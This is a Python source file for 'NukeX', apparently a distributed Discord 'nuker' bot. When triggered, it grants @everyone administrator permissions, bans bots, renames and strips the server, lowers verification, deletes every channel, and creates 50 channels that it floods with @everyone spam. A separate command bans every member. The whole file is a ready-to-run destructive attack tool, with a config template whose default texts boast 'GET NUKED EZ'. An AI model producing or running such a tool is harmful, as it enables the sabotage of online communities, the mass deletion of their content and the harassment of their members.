# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import json
import asyncio
from colorama import init, Fore
import ctypes
import sys
import os
import random
import time
import requests
import threading

init(autoreset=True)
green = Fore.LIGHTMAGENTA_EX
dgreen = Fore.LIGHTMAGENTA_EX
white = Fore.RESET
red = Fore.LIGHTMAGENTA_EX
yellow = Fore.LIGHTMAGENTA_EX
blue = Fore.LIGHTMAGENTA_EX
dblue = Fore.MAGENTA
gray = Fore.LIGHTBLACK_EX
intents = discord.Intents.all()

channel1 = f"{gray}[ {Fore.LIGHTGREEN_EX}Channel{gray} ]"
channel2 = f"{gray}[ {Fore.LIGHTRED_EX}Channel{gray} ]"
roles1 = f"{gray}[  {Fore.LIGHTGREEN_EX}Roles{gray}  ]"
roles2 = f"{gray}[  {Fore.LIGHTRED_EX}Roles{gray}  ]"
name1 = f"{gray}[  {Fore.LIGHTGREEN_EX}Guild{gray}  ]"
name2 = f"{gray}[  {Fore.LIGHTRED_EX}Guild{gray}  ]"
ban1 = f"{gray}[ {Fore.LIGHTGREEN_EX}Banning{gray} ]"
ban2 = f"{gray}[ {Fore.LIGHTRED_EX}Banning{gray} ]"
delete = f"[{Fore.LIGHTRED_EX}-{gray}]{white}"
create = f"[{Fore.LIGHTGREEN_EX}+{gray}]{white}"
perms1 = f"{gray}[  {Fore.LIGHTGREEN_EX}Perms{gray}  ]"
perms2 = f"{gray}[  {Fore.LIGHTRED_EX}Perms{gray}  ]"
status = f"{gray}[  {Fore.LIGHTGREEN_EX}Pings{gray}  ]"
bad = f"{gray}[{blue}-{gray}]{white}"
pings = 0
bans = 0
members_count = 0

ban_threads = 0

def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)

print(f"""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{blue}
 ███▄    █  █    ██  ██ ▄█▀ ▓█████▒██   ██▒
 ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▒▒ █ █ ▒░
▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ░░  █   ░
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄ ░ █ █ ▒ 
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████▒██▒ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ▒▒ ░ ░▓ ░
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░  ░░   ░▒ ░
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░   ░    ░  
         ░    ░     ░  ░   ░   ░   ░    ░  

Made by Chasa | Visit chasa.wtf for more tools.
 """)

print(f"\n{gray}[{blue}/{gray}]{white} Loading Config...")
global config, TOKEN, PREFIX, GUILD_NAME, CHANNEL_NAMES, ROLE_NAMES, SPAM_MESSAGES, AUDIT_LOG
try:
    with open('config.json') as f:
        config = json.load(f)
    TOKEN = config["token"]
    PREFIX = config["prefix"]
    GUILD_NAME = config["change-name"]
    CHANNEL_NAMES = config["channel-names"].split(",")
    SPAM_MESSAGES = config["spam-messages"].split(",")
    AUDIT_LOG = config["audit-log-reasons"].split(",")
    ROLE_NAMES = config["role-names"].split(",")
    COMMAND_ID = int(config["command-id"])
    print(f"{gray}[{dgreen}+{gray}]{white} Loaded Config, loading bot..")
except Exception as e:
    print(f"{red}[!]{white} Couldn't load config.json. Creating now...     ")
    autoConfig = r'''{ 
    "comment" : "SEPERATE ITEMS WITH COMMAS",
    "token" : "enter token here",
    "command-id" : "user id of the person who is allowed to do cmds",
    "prefix" : "-",
    "change-name" : "NUKED",
    "channel-names" : "nuked-ez,nuked-lol",
    "role-names" : "lol,ez",
    "spam-messages" : "GET NUKED EZ - @everyone,@everyone ezzz",
    "audit-log-reasons" : "get nuked ez,nuked"
}'''
    with open("config.json", "w") as f:
        f.write(autoConfig)
    print(f"{gray}[{dgreen}+{gray}]{white} Created config.json.")
    print(f"{gray}[{red}!{gray}]{white} Add token to the config and reboot.")
    time.sleep(3)
    sys.exit()

bot = commands.Bot(command_prefix=PREFIX, case_insensitive=True, intents=intents)

pinging = True
banning = False
members = []
guild = ""

@bot.event
async def on_ready():
    global pings
    global bans
    global members_count
    title(f"[NukeX | chasa.wtf] Waiting for {PREFIX}n in guild..")
    print(f"""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{blue}
 ███▄    █  █    ██  ██ ▄█▀ ▓█████▒██   ██▒
 ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▒▒ █ █ ▒░
▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ░░  █   ░
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄ ░ █ █ ▒ 
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████▒██▒ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ▒▒ ░ ░▓ ░
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░  ░░   ░▒ ░
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░   ░    ░  
         ░    ░     ░  ░   ░   ░   ░    ░  

Made by Chasa | Visit chasa.wtf for more tools.
""")
    print(f"""{gray}[{blue}{PREFIX}n{gray}]{white} Nuke Server                                                
{gray}[{blue}{PREFIX}b{gray}]{white} Start Banning (slow)
{gray}[{blue}{PREFIX}p{gray}]{white} Toggle Pinging""")
    while True:
        if guild != "":
            pings_before = 0
            pings = 0
            bans_before = 0
            while True:
                title(f"[NukeX | chasa.wtf] Nuking {guild.name} // Pinging: {pinging} - Pings/s: {pings - pings_before} // Banning: {banning} - Bans/s: {bans - bans_before}")
                pings_before = pings
                bans_before = bans
                await asyncio.sleep(1)
        await asyncio.sleep(0.5)

@bot.command()
async def n(ctx):
    if ctx.author.id == COMMAND_ID:
        try:
            await ctx.message.delete()
        except:
            pass
        global pings
        global bans
        global members_count
        global members
        global guild
        members_count = ctx.guild.member_count
        guild = ctx.guild
        for member in ctx.guild.members:
            members.append(member)
        try:
            role = discord.utils.get(ctx.guild.roles, name="@everyone")
            await role.edit(permissions=discord.Permissions.all())
            print(f"{perms1}{white} @everyone Admin")
        except:
            print(f"{perms2}{white} @everyone Admin")
        print(f"{gray}--- {dblue}Banning Bots{gray} ---")
        for member in ctx.guild.members:
            if member.bot:
                try:
                    await ctx.guild.ban(user=member, reason=random.choice(AUDIT_LOG))
                    print(f"{ban1} {delete} {member.name}#{member.discriminator}")
                    bans += 1
                except:
                    print(f"{ban2} {delete} {member.name}#{member.discriminator}")
        print(f"{gray}--- {dblue}Guild Edits{gray} ---")
        try:
            await ctx.guild.edit(name=GUILD_NAME)
            print(f"{name1}{white} Name: {GUILD_NAME}")
        except:
            print(f"{name2}{white} Name: {GUILD_NAME}")
        try:
            await ctx.guild.edit(icon=None)
            print(f"{name1}{white} Icon: None")
        except:
            print(f"{name2}{white} Icon: None")
        try:
            await ctx.guild.edit(banner=None)
            print(f"{name1}{white} Banner: None")
        except:
            print(f"{name2}{white} Banner: None")
        try:
            await ctx.guild.edit(verification_level=discord.VerificationLevel.low)
            print(f"{name1}{white} Prot Level: Low")
        except:
            print(f"{name2}{white} Prot Level: Low")
        inv_code = random.randint(1111111, 999999999)
        try:
            await ctx.guild.edit(vanity_code=str(inv_code))
            print(f"{name1}{white} Invite Code: {inv_code}")
        except:
            print(f"{name2}{white} Invite Code: {inv_code}")
        try:
            await ctx.guild.edit(default_notifications=discord.NotificationLevel.all_messages)
            print(f"{name1}{white} Default Notis: All")
        except:
            print(f"{name2}{white} Default Notis: All")
        print(f"{gray}--- {dblue}Channels{gray} ---")
        for channel in ctx.guild.channels:
            try:
                await channel.delete(reason=random.choice(AUDIT_LOG))
                print(f"{channel1} {delete} {channel.name}")
            except:
                print(f"{channel2} {delete} {channel.name}")
        for x in range(50):
            try:
                name = random.choice(CHANNEL_NAMES)
                await ctx.guild.create_text_channel(name, reason=random.choice(AUDIT_LOG))
                print(f"{channel1} {create} #{name}")
            except:
                print(f"{channel2} {create} #{name}")
        print(f"{gray}--- {dblue}Threading at Full Speed{gray} ---")

@bot.command()
async def p(ctx):
    if ctx.author.id == COMMAND_ID:
        await ctx.message.delete()
        global pinging
        if pinging == True:
            pinging = False
            print(f"{status} {delete} Pinging Disabled. (by {ctx.author.name}#{ctx.author.discriminator})")
        else:
            pinging = True
            print(f"{status} {create} Pinging Enabled. (by {ctx.author.name}#{ctx.author.discriminator})")

@bot.event
async def on_guild_channel_create(channel):
    global pings
    global members
    global guild
    global bans
    global banning
    global pinging
    if channel.name.replace("-", " ") in CHANNEL_NAMES or channel.name in CHANNEL_NAMES:
        while True:
            if pinging == True:
                try:
                    await channel.send(random.choice(SPAM_MESSAGES))
                    pings += 1
                except:
                    pass
            await asyncio.sleep(0.1)

@bot.command()
async def b(ctx):
    global bans
    await ctx.message.delete()
    print(f"{ban1} {create} Banning Started. (by {ctx.author.name}#{ctx.author.discriminator})")
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(user=member, reason=random.choice(AUDIT_LOG))
            print(f"{ban1} {delete} {member.name}#{member.discriminator}")
            bans += 1
        except Exception as e:
            print(f"{ban2} {delete} {member.name}#{member.discriminator}")

try:
    bot.run(TOKEN, bot=True)
except discord.errors.PrivilegedIntentsRequired as e:
    headers = { 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization": f"Bot {TOKEN}"
    }
    req = requests.get("https://discord.com/api/users/@me", headers=headers)
    userData = req.json()
    print(f"{red}[!]{white} Enable Privilages at https://discord.com/developers/applications/{userData['id']}/bot")
    print(e)
    time.sleep(5)
    sys.exit()
except discord.errors.LoginFailure as e:
    print(f"{red}[!]{white} Invalid Token. Bot Tokens Only. Change in config.json")
    print(e)
    time.sleep(5)
    sys.exit()
except Exception as e:
    print(f"{red}[!]{white} Unknown Error. Debug: {e}")
    time.sleep(5)
    sys.exit()
